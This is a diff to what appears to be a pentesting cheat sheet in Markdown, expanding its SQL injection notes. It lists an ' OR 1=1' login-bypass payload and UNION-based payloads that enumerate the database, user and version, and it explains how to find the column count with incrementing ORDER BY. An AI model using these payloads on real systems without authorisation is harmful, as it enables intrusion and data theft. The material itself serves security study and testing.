@@ -1644,7 +1644,9 @@ You can find it here: [projectdiscovery/nuclei](https://github.com/projectdiscov
 - Try this payload `' OR 1=1 -- //`
 
 **UNION-based payloads**
-- `' ORDER BY 1-- //` Verify the exact number of columns
+- `' ORDER BY <NUMBER>-- //` Verify the exact number of columns
+  - increment the `<NUMBER>` value from `1` to `..` until you reach an error like `Unknown column '7' in 'table'`
+  - [check this](https://portswigger.net/web-security/sql-injection/union-attacks#determining-the-number-of-columns-required-in-a-sql-injection-union-attack)
 - `' UNION SELECT database(), user(), @@version, null, null -- //` enumerate the database via SQL UNION Injection
   - use `null` to have the correct number of columns
 
